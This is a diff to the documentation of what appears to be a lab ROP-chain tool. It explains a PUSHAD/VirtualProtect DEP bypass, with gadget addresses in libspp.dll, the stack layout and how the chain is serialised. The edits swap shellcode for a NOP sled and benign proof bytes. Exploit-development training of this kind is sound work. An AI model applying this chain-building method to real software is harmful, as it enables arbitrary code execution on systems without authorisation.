@@ -33,10 +33,13 @@ with a real address found by `mona.py`, `rp++`, or a WinDbg script:
   "pop_edi_ret":        { "address": "0x1002f529", "module": "libspp.dll", "instruction": "pop edi; ret" },
   "ptr_to_ret":         { "address": "0x10014fcd", "module": "libspp.dll", "instruction": "ret" },
   "pop_esi_ret":        { "address": "0x1001f5f2", "module": "libspp.dll", "instruction": "pop esi; ret" },
-  "virtualprotect_ptr": { "address": "0x1060e060", "module": "libspp.dll (IAT)", "instruction": "ptr to VirtualProtect" },
+  "virtualprotect_ptr": { "address": "0x10601234", "module": "libspp.dll", "instruction": "callable VirtualProtect thunk" },
   ...
 }
 ```
+
+`GadgetDB` also accepts the lab template's top-level `modules` and `gadgets`
+objects; only entries inside `gadgets` are loaded for chain resolution.
 
 ### 2. Plan the chain
 
@@ -78,11 +81,10 @@ DryRunPrinter().print_chain(chain, db, bad_chars=b"\x00\x0a\x0d")
 [00]  +0x000  gadget_ref          0x1002f529  pop_edi_ret @ libspp.dll          load skeleton-ret pointer into EDI
 [01]  +0x004  gadget_ref          0x10014fcd  ptr_to_ret @ libspp.dll           EDI ← address of any ret instruction (PUSHAD trampoline)
 [02]  +0x008  gadget_ref          0x1001f5f2  pop_esi_ret @ libspp.dll          load VirtualProtect address into ESI
-[03]  +0x00c  gadget_ref          0x1060e060  virtualprotect_ptr @ libspp.dll   ESI ← VirtualProtect (IAT entry or resolved function)
+[03]  +0x00c  gadget_ref          0x10601234  virtualprotect_ptr @ libspp.dll   ESI ← callable VirtualProtect target
 ...
-[17]  +0x044  shellcode_ptr        <dynamic>  (runtime)                         shellcode base — pre-PUSHAD ESP == lpAddress
 ----------------------------------------------------------------------------------------------------
-Total: 18 dwords, 72 bytes
+Total: 17 dwords, 68 bytes
 ```
 
 Missing gadgets or bad-byte hits are printed in red on colour terminals.
@@ -92,8 +94,8 @@ Missing gadgets or bad-byte hits are printed in red on colour terminals.
 ```python
 from Tools.rop import ChainSerializer
 
-raw = ChainSerializer().serialize(chain, db, shellcode_addr=0x00419000)
-# raw is bytes, ready to embed in the exploit buffer
+raw = ChainSerializer().serialize(chain, db)
+payload = raw + (b"\x90" * 16) + benign_proof_bytes
 ```
 
 ---
@@ -105,7 +107,7 @@ The planner uses the **PUSHAD register-setup** technique:
 ```
 Before PUSHAD:
   EDI = ptr_to_ret        ← skeleton ret (PUSHAD trampoline)
-  ESI = VirtualProtect    ← called via two rets after PUSHAD
+  ESI = callable VirtualProtect target ← called via two rets after PUSHAD
   EBP = jmp_esp gadget    ← VirtualProtect's return address
   EBX = shellcode_size    ← dwSize (built null-free via neg trick)
   EDX = 0x40              ← flNewProtect = PAGE_EXECUTE_READWRITE
@@ -116,16 +118,18 @@ After PUSHAD the stack looks like:
   [ESP+00] EDI  ← ret pops this → lands on ESI (VirtualProtect)
   [ESP+04] ESI  ← VirtualProtect address
   [ESP+08] EBP  ← return address (jmp esp)
-  [ESP+0C] old-ESP  ← lpAddress (== shellcode base)
+  [ESP+0C] old-ESP  ← lpAddress (first byte appended after the ROP chain)
   [ESP+10] EBX  ← dwSize
   [ESP+14] EDX  ← flNewProtect
   [ESP+18] ECX  ← lpflOldProtect
   [ESP+1C] EAX  ← NOP / alignment
 ```
 
-After VirtualProtect returns, `jmp esp` jumps into the now-executable
-shellcode region.  Prepend the shellcode with a short NOP sled (`\x90 * 16`)
-to absorb the few-byte offset from PUSHAD frame cleanup.
+The pre-PUSHAD ESP points immediately after the final `pushad; ret` address, so
+that location is passed as `lpAddress`. After VirtualProtect returns, `jmp esp`
+executes the saved EAX value (`0x90909090`) and then continues into the bytes
+appended directly after the serialized chain. Append a short NOP sled followed
+by benign proof bytes; do not serialize a pointer in that position.
 
 ### Required gadget DB keys
 
@@ -134,7 +138,7 @@ to absorb the few-byte offset from PUSHAD frame cleanup.
 | `pop_edi_ret` | `pop edi; ret` |
 | `ptr_to_ret` | any `ret` instruction |
 | `pop_esi_ret` | `pop esi; ret` |
-| `virtualprotect_ptr` | IAT entry or resolved VirtualProtect address |
+| `virtualprotect_ptr` | callable wrapper, import thunk, or resolved VirtualProtect address |
 | `pop_ebp_ret` | `pop ebp; ret` |
 | `jmp_esp` | `jmp esp` |
 | `pop_eax_ret` | `pop eax; ret` *(used twice)* |
